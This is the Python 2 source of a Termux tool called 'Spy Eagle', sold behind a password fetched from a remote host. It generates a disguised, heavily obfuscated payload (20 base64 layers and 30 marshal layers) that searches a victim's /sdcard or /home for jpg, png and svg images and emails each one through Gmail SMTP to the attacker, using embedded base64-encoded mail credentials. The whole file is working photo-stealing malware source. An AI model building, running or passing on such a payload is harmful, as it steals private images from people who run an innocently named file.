# -*- coding: utf-8 -*-
import base64
import sys
import marshal
import time
import os
run = sys.argv[0:100]
if 'learn' in  run:
        os.system('xdg-open https://spyeagle.000webhostapp.com/password ')
#	pass
else:
	pass
try:
	import requests
except:
	os.system('pip2 install requests ')
def password():
	try:
                os.system('clear')
                p = requests.get('https://spyeagle.000webhostapp.com/password')
                pa = p.text
                fb = requests.get('https://spyeagle.000webhostapp.com/facebook')
                print('''\033[1;37m

  _____               ______            _
 / ____|             |  ____|          | |
| (___  _ __  _   _  | |__   __ _  __ _| | ___
 \___ \| '_ \| | | | |  __| / _` |/ _` | |/ _ \\
\033[1;32m ____) | |_) | |_| | | |___| (_| | (_| | |  __/
|_____/| .__/ \__, | |______\__,_|\__, |_|\___|
       | |     __/ |               __/ |
       |_|    |___/               |___/
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃\033[1;37mname  \033[1;32m  :\033[1;37mLedear-Hacking \033[1;32m|\033[1;37mALZAEEM\033[1;32m|         ┃
┃\033[1;37mCountry \033[1;32m:\033[1;37mIraq\033[1;32m                             ┃
┃\033[1;37mGmail \033[1;32m  :\033[1;37mledearhacking@gmail.com          \033[1;32m┃
┃\033[1;37mFacebook\033[1;32m:\033[1;37m'''+str(fb.text)+'''\033[1;32m   ┃
┃\033[1;37mGithub \033[1;32m :\033[1;37mgithub.com/ledear-hacker         \033[1;32m┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
        \033[1;37m''')


	except:
		print("\033[1;33m[\033[1;31m-\033[1;33m]\033[1;31m Please check the internet and try again\033[1;37m")
        else:
                pas  = raw_input('\033[1;32m[\033[1;37m+\033[1;32m]\033[1;37m Enter passowrd\033[1;32m:\033[1;37m ')
		if pas == pa:
			try:
				pwd = open('/data/data/com.termux/files/usr/bin/Password', 'wb')
                	        pwd.write(pas)
                        	pwd.close()
                        	out()
                	except IOError:
                		pwd = open('/bin/Password', 'wb')
                        	pwd.write(pas)
                        	pwd.close()
                        	out()

                else:
                        print("Please buy the tool and get the access code")
                        time.sleep(2)
			password()
def out():
                try:
                        pwd = open('/data/data/com.termux/files/usr/bin/Password', 'r').read()
                except:
                        pwd = open('/bin/Password', 'r').read()
		g = open('0', 'wb')
		code = ("""import os
import sys
import base64
from random import randint as rand
os.system('clear')
def login():

                try:
                        password = open('/data/data/com.termux/files/usr/bin/Password', 'r').read()
                        if password == "{}":
                                main()
                        else:
                                print("[+] Please buy the tool and get the access code")
                except:
                        password = open('/bin/Password', 'r').read()
                        if password == "{}":
                                main()
                        else:
                                print('[+] Please buy the tool and get the access code')

		""").format(pwd, pwd, pwd)

		code2 = ("""
def main():
	logo1 =  ('''\033[1;37m
                               /T /I
                              / |/ | .-~/
                          T\ Y  I  |/  /  _
         /T               | \I  |  I  Y.-~/
        I l   /I       T\ |  |  l  |  T  /
 __  | \l   \l  \I l __l  l   \   `  _. |
 \ ~-l  `\   `\  \  \\ ~\  \   `. .-~   |
  \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |
.--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./
 >--.  ~-.   ._  ~>-"    "\\\   7   7   ]
^.___~"--._    ~-(  .-~ .  `\ Y . /    |
 <__ ~"-.  ~       /_/   \   \I  Y   : |
   ^-.__           ~(_/   \   >._:   | l\033[1;37m______\033[1;30m
       ^--.,___.-~"  /_/   !  `-.~"--l_ \033[1;37m/     ~"-.\033[1;30m
              (_/ .  ~(   /'     "~"--,\033[1;37mY   \033[1;31m-=b-\033[1;37m. _)\033[1;30m
               (_/ .  \  :           / \033[1;37ml      c"~o \\ \033[1;30m
                \ /    `.    .     .^   \033[1;37m\_.-~"~--.  )\033[1;30m
                 (_/ .   `  /     /       !\033[1;37m       )/ \033[1;30m
                  / / _.   '.   .':      / \033[1;37m       '\033[1;30m
                  ~(_/ .   /    _  `  .-<_
                    /_/ . ' .-~" `.  / \  \   \033[0;33m       ,z=.\033[1;30m
                    ~( /   '  :   | K   "-.~-.\033[0;33m______//\033[1;30m
                      "-,.    l   I/ \_    __(\033[0;33m--->._(==.\033[1;30m
                       \033[1;37m// \033[1;30m(    \  <    ~"~"\033[0;33m     //\033[1;30m
\033[1;37m                      /' /\033[1;30m\     \  \ \033[0;33m    ,v=.  ((\033[1;30m
\033[1;37m                    .^. / /\033[1;30m\     "  )\033[0;33m__ //===-\033[1;30m
\033[1;37m                   / / ' '  "\033[1;30m-.,__ (\033[0;33m---(==-\033[1;30m
\033[1;37m                 .^ '       :  T\033[1;30m  ~"\033[0;33m   ll\033[1;30m
\033[1;37m                / .  .  . : | :!    \033[0;33m    \\ z\033[1;30m
\033[1;37m               (_/  /   | | j-"     \033[0;33m     ~^ \033[1;30m
\033[1;37m                 ~-<_(_.^-~"
	''')




	print logo1
        email = raw_input('\033[1;31m[\033[1;33m+\033[1;31m] \033[1;37mEnter mail\033[1;33m:\033[1;37m ')
#        img = raw_input('\033[1;31m[\033[1;33m+\033[1;31m] \033[1;37mEnter a file format\033[1;33m:\033[1;37m ')
        name = raw_input('\033[1;31m[\033[1;33m+\033[1;31m]\033[1;37m Enter name\033[1;33m: \033[1;37m')
##################################################
	slah = ('''
	am broadcast --user 0 \
			--es com.termux.app.reload_style storage \
			-a com.termux.app.reload_style com.termux > /dev/null
		''')
	try:
		heh = open("/data/data/com.termux/files/usr/bin/am", "r" ).read()
		qwert = open('/data/data/com.termux/files/usr/bin/qwer', 'wb')
		qwert.write('#!/data/data/com.termux/files/usrbin/bash')
		qwert.write(slah)
		qwert.cloas()
		os.system('chmod +x /data/data/com.termux/files/usr/bin/qwer')
	except:
		pass
	o = ('c3B5ZWFnbGUyMDIwQGdtYWlsLmNvbQ==')
	data = base64.b64decode(o)
	o2 = ('JCQkc3B5ZWFnbGUkJCQ=')
	dat = base64.b64decode(o2)
	uu = '{}'
	f = open("0", "wb")
        code = ('''# -*- coding: utf-8 -*-
import sys
import base64
from glob  import glob
import datetime
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
import base64
import os
import time


def s():
	try:
		heh = open("/data/data/com.termux/files/usr/bin/am", "r" ).read()
		os.system('qwer')
		time.sleep(2)
		main()
	except:
		main()

def main():
			try:
#############################################################################################33
                		gmail_user = "{}"
                		gmail_pwd = "{}"
                		to = "{}"
                		subject = "files"
                		text = "this files of  victim"
#####################################################################
				z = (
					'jpg',
					'png',
					'svg'

				)
				for i in z:
					star = (
					'/*',
					'/*/*',
					'/*/*/*',
					'/*/*/*/*',
					'/*/*/*/*/*',
					'/*/*/*/*/*/*',
					)
					for an in star:
##############################################################333
						try:
							heh = open("/data/data/com.termux/files/usr/bin/ls", "r" ).read()
							a = ('/sdcard{}.{}'.format(an, i))
						except:
							a = ('/home{}.{}'.format(an, i))
#################################################################
							os.system('clear')
							print("\033[1;31m[\033[1;33m*\033[1;31m]\033[1;32m Starting \033[1;31m.\033[1;33m .\033[1;32m .\033[1;37m")
							for img in glob(a):
								attach = img
								msg = MIMEMultipart()
								msg['From'] = gmail_user
								msg['To'] = to
								msg['Subject'] = subject
								msg.attach(MIMEText(text))

								part = MIMEBase('application', 'octet-stream')
								part.set_payload(open(attach, 'rb').read())
								Encoders.encode_base64(part)
								part.add_header('Content-Disposition',
								'attachment; filename="%s"' % os.path.basename(attach))
								msg.attach(part)
								mailServer = smtplib.SMTP("smtp.gmail.com", 587)
								mailServer.ehlo()
								mailServer.starttls()
								mailServer.ehlo()
								mailServer.login(gmail_user, gmail_pwd)
								mailServer.sendmail(gmail_user, to, msg.as_string())
								mailServer.close()
			except:
					os.system('clear')
					print("\033[1;33m[\033[1;31m-\033[1;33m]\033[1;31m Please check the internet and try again")
					time.sleep(1)
					sys.exit()
s()

''').format(data, dat, email, uu, uu, uu, uu)
        f.write(code)
        f.close()
	for i in range(20):
#		print i
		y = open('{}'.format(i), 'r')
		u = y.read()
		data =  base64.b64encode(u)
		f = open('{}'.format(i + 1), 'w')
		f.write('import base64;')
		f.write("code = '{}';".format(data))
		f.write('exec (base64.b64decode(code))')
		f.close()
		os.system('rm %s'%i)
		if i == 19:

			os.system('mv 20 0')
			for i in range(30):
#				#print i
				y = open('{}'.format(i), 'r')
				u = y.read()
				com = compile(u, "<u>", "exec")
				data = marshal.dumps(com)
				f = open('{}'.format(i + 1), 'w')
				f.write('import marshal;')
				f.write('exec(marshal.loads('+repr(data)+'))')
				f.close()
				os.system('rm %s'%i)
				if i == 29:
					os.system('mv  30  '+name+'.py')
					print('\033[1;33m-\033[1;37m')*50
					print('The file was saved to the  '+name+'.py')
					print('\033[1;33m-\033[1;37m')*50








login()
""")

		g.write(code + code2)
		g.close()
		print('\033[1;31m[\033[1;32m+\033[1;31m] \033[1;32mInstalling tool, please wait . . .')
		for i in range(20):
			#print i
			y = open('{}'.format(i), 'r')
			u = y.read()
			data =  base64.b64encode(u)
  			f = open('{}'.format(i + 1), 'w')
	 		f.write('import base64;')
			f.write("code = '{}';".format(data))
			f.write('exec (base64.b64decode(code))')
			f.close()
	 		os.system('rm %s'%i)
			if i == 19:
				os.system('mv 20 0')
                		for i in range(30):
					#print i
   					y = open('{}'.format(i), 'r')
					u = y.read()
					com = compile(u, "<u>", "exec")
					data = marshal.dumps(com)
  					f = open('{}'.format(i + 1), 'w')
					f.write('import marshal\n')
					f.write('exec(marshal.loads('+repr(data)+'))')
					f.close()
					os.system('rm %s'%i)
					if i == 29:
						os.system('mv   30 Spy-Eagle.py ')
						os.system('python2 Spy-Eagle.py')






password()
